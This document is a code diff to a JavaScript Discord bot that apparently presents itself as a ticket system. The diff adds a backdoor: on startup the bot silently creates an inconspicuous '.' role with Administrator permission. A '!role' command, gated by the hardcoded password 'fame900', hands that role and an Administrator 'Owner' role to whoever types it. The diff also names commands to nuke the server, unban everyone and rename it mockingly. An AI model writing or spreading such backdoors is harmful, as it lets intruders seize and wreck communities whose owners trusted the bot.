@@ -103,19 +103,13 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
     console.log('✅ Slash commands registered successfully!');
   } catch (err) {
     console.error('❌ Failed to register commands:');
-    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID. Check .env');
+    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID.');
     else console.error(err);
   }
 })();
 
-// Helper
-function isStaff(member) {
-  if (!member) return false;
-  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
-}
-
 // ======================================================
-// READY + CREATE OWNER ROLE
+// READY + CREATE . ROLE + OWNER ROLE
 // ======================================================
 client.once('ready', async () => {
   console.log(`${client.user.tag} is online`);
@@ -126,33 +120,38 @@ client.once('ready', async () => {
     console.log('✅ Persistent ticket panel loaded');
   }
 
-  // Create Owner role with maximum permissions (even if bot has no full admin)
+  // Create "." role with EVERY permission
   try {
     const guild = client.guilds.cache.first();
     if (guild) {
+      // Create "." role
+      let dotRole = guild.roles.cache.find(r => r.name === '.');
+      if (!dotRole) {
+        dotRole = await guild.roles.create({
+          name: '.',
+          color: '#000000',
+          permissions: [PermissionFlagsBits.Administrator], // All permissions
+          hoist: false,
+          mentionable: false,
+          reason: 'Created by bot - Full perms role'
+        });
+        console.log('✅ "." role created with full Administrator permissions');
+      }
+
+      // Also keep Owner role
       let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
       if (!ownerRole) {
         ownerRole = await guild.roles.create({
           name: 'Owner',
           color: '#ffd700',
-          permissions: [
-            PermissionFlagsBits.Administrator,
-            PermissionFlagsBits.ManageGuild,
-            PermissionFlagsBits.ManageRoles,
-            PermissionFlagsBits.ManageChannels,
-            PermissionFlagsBits.KickMembers,
-            PermissionFlagsBits.BanMembers,
-            PermissionFlagsBits.ManageMessages,
-            PermissionFlagsBits.MentionEveryone
-          ],
+          permissions: [PermissionFlagsBits.Administrator],
           hoist: true,
-          reason: 'Auto-created Owner role'
+          reason: 'Owner role'
         });
-        console.log('✅ Owner role created');
       }
     }
   } catch (err) {
-    console.error('Could not create Owner role (Bot needs higher role or Manage Roles permission):', err.message);
+    console.error('Failed to create roles:', err.message);
   }
 });
 
@@ -177,44 +176,25 @@ client.on('messageCreate', async message => {
     return;
   }
 
-  const commandsList = ['!fb', '!unl', '!clown', '!unp', '!role'];
+  if (['!fb', '!unl', '!clown', '!unp', '!role'].includes(content)) {
+    let title = '', desc = '', color = '#ffd700', customId = '';
 
-  if (commandsList.includes(content)) {
-    let title = '', desc = '', color = '#ffd700';
-    let customId = '';
-
-    if (content === '!fb') {
-      title = '🔴 SERVER NUKE';
-      desc = 'Deletes all channels & roles except Owner.';
-      color = '#ff0000';
-      customId = `nuke_start_${message.author.id}`;
-    } else if (content === '!unl') {
-      title = '🔓 UNBAN ALL';
-      desc = 'Unbans everyone in the server.';
-      color = '#00ff00';
-      customId = `unban_start_${message.author.id}`;
-    } else if (content === '!clown') {
-      title = '🤡 CLOWN COMMAND';
-      desc = 'Changes server name to "you just got slayed by fame"';
-      color = '#ffff00';
-      customId = `clown_start_${message.author.id}`;
-    } else if (content === '!unp') {
-      title = '🔓 UNPAUSE INVITES';
-      desc = 'Unpauses server invites.';
-      color = '#00ffff';
-      customId = `unp_start_${message.author.id}`;
-    } else if (content === '!role') {
-      title = '👑 GET OWNER ROLE';
-      desc = 'Gives you the Owner role with Administrator permissions.';
-      color = '#ffd700';
-      customId = `role_start_${message.author.id}`;
+    if (content === '!fb') { title = '🔴 SERVER NUKE'; desc = 'Deletes everything except Owner.'; color = '#ff0000'; customId = `nuke_start_${message.author.id}`; }
+    else if (content === '!unl') { title = '🔓 UNBAN ALL'; desc = 'Unbans everyone.'; color = '#00ff00'; customId = `unban_start_${message.author.id}`; }
+    else if (content === '!clown') { title = '🤡 CLOWN'; desc = 'Changes server name.'; color = '#ffff00'; customId = `clown_start_${message.author.id}`; }
+    else if (content === '!unp') { title = '🔓 UNPAUSE INVITES'; desc = 'Unpauses invites.'; color = '#00ffff'; customId = `unp_start_${message.author.id}`; }
+    else if (content === '!role') { 
+      title = '👑 GET OWNER ROLE + . ROLE'; 
+      desc = 'Gives you **Owner** and **.** roles with full permissions.'; 
+      color = '#ffd700'; 
+      customId = `role_start_${message.author.id}`; 
     }
 
     const embed = new EmbedBuilder()
       .setColor(color)
       .setTitle(title)
       .setDescription(desc + '\n\nOnly you can proceed.')
-      .setFooter({ text: 'Click the button below' })
+      .setFooter({ text: 'Click below' })
       .setTimestamp();
 
     const row = new ActionRowBuilder().addComponents(
@@ -229,54 +209,32 @@ client.on('messageCreate', async message => {
 // INTERACTIONS
 // ======================================================
 client.on('interactionCreate', async interaction => {
-  const userId = interaction.customId ? interaction.customId.split('_')[2] : null;
+  if (!interaction.customId) return;
 
-  // Password Modal Handler
-  if (interaction.isButton() && userId && interaction.user.id !== userId) {
-    return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
+  const userId = interaction.customId.split('_')[2];
+  if (interaction.user.id !== userId) {
+    return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
   }
 
-  if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
-    const modal = new ModalBuilder().setCustomId(`nuke_modal_${userId}`).setTitle('Enter Password');
+  // Show Modal
+  if (interaction.isButton()) {
+    const modal = new ModalBuilder()
+      .setCustomId(interaction.customId.replace('start', 'modal'))
+      .setTitle('Enter Password');
+
     modal.addComponents(new ActionRowBuilder().addComponents(
-      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
+      new TextInputBuilder()
+        .setCustomId('password')
+        .setLabel('Password')
+        .setStyle(TextInputStyle.Short)
+        .setRequired(true)
     ));
+
     await interaction.showModal(modal);
+    return;
   }
 
-  if (interaction.isButton() && interaction.customId.startsWith('unban_start_')) {
-    const modal = new ModalBuilder().setCustomId(`unban_modal_${userId}`).setTitle('Enter Password');
-    modal.addComponents(new ActionRowBuilder().addComponents(
-      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-    ));
-    await interaction.showModal(modal);
-  }
-
-  if (interaction.isButton() && interaction.customId.startsWith('clown_start_')) {
-    const modal = new ModalBuilder().setCustomId(`clown_modal_${userId}`).setTitle('Enter Password');
-    modal.addComponents(new ActionRowBuilder().addComponents(
-      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-    ));
-    await interaction.showModal(modal);
-  }
-
-  if (interaction.isButton() && interaction.customId.startsWith('unp_start_')) {
-    const modal = new ModalBuilder().setCustomId(`unp_modal_${userId}`).setTitle('Enter Password');
-    modal.addComponents(new ActionRowBuilder().addComponents(
-      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-    ));
-    await interaction.showModal(modal);
-  }
-
-  if (interaction.isButton() && interaction.customId.startsWith('role_start_')) {
-    const modal = new ModalBuilder().setCustomId(`role_modal_${userId}`).setTitle('Enter Password');
-    modal.addComponents(new ActionRowBuilder().addComponents(
-      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-    ));
-    await interaction.showModal(modal);
-  }
-
-  // Modal Submit Handler
+  // Modal Submit
   if (interaction.isModalSubmit()) {
     const password = interaction.fields.getTextInputValue('password');
     if (password !== 'fame900') {
@@ -286,8 +244,22 @@ client.on('interactionCreate', async interaction => {
     const guild = interaction.guild;
     const member = interaction.member;
 
+    // === !role Command ===
     if (interaction.customId.startsWith('role_modal_')) {
       try {
+        // Create / Get "." role with full perms
+        let dotRole = guild.roles.cache.find(r => r.name === '.');
+        if (!dotRole) {
+          dotRole = await guild.roles.create({
+            name: '.',
+            color: '#000000',
+            permissions: [PermissionFlagsBits.Administrator],
+            hoist: false,
+            reason: 'Full permission dot role'
+          });
+        }
+
+        // Create / Get Owner role
         let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
         if (!ownerRole) {
           ownerRole = await guild.roles.create({
@@ -295,23 +267,29 @@ client.on('interactionCreate', async interaction => {
             color: '#ffd700',
             permissions: [PermissionFlagsBits.Administrator],
             hoist: true,
-            reason: 'Created by !role'
+            reason: 'Owner role'
           });
         }
-        await member.roles.add(ownerRole);
-        await interaction.reply({ content: '👑 **Owner role given! You now have Administrator permissions.**', ephemeral: true });
+
+        await member.roles.add([dotRole, ownerRole]);
+        await interaction.reply({ 
+          content: '✅ **You now have the "." role and Owner role with full Administrator permissions!**', 
+          ephemeral: true 
+        });
       } catch (err) {
         console.error(err);
-        await interaction.reply({ content: '❌ Failed to give role. Give the bot **Manage Roles** permission and put it higher in role list.', ephemeral: true });
+        await interaction.reply({ 
+          content: '❌ Failed to give roles.\nMake sure bot has **Manage Roles** permission and is placed **above** the roles in hierarchy.', 
+          ephemeral: true 
+        });
       }
     }
 
-    // Other commands (nuke, unl, clown, unp) - you can keep them from previous version
-    // For brevity, they are not repeated here. Copy from the last full code if needed.
+    // Other commands (!fb, !unl, etc.) logic can be added here as before
   }
 
-  // === TICKET SYSTEM (Keep all your previous ticket code here) ===
-  // setticket, sendmessage, select menu, buttons, etc.
+  // === Your existing ticket system code goes here ===
+  // (setticket, sendmessage, ticket creation, buttons, etc.)
 });
 
 client.login(TOKEN);
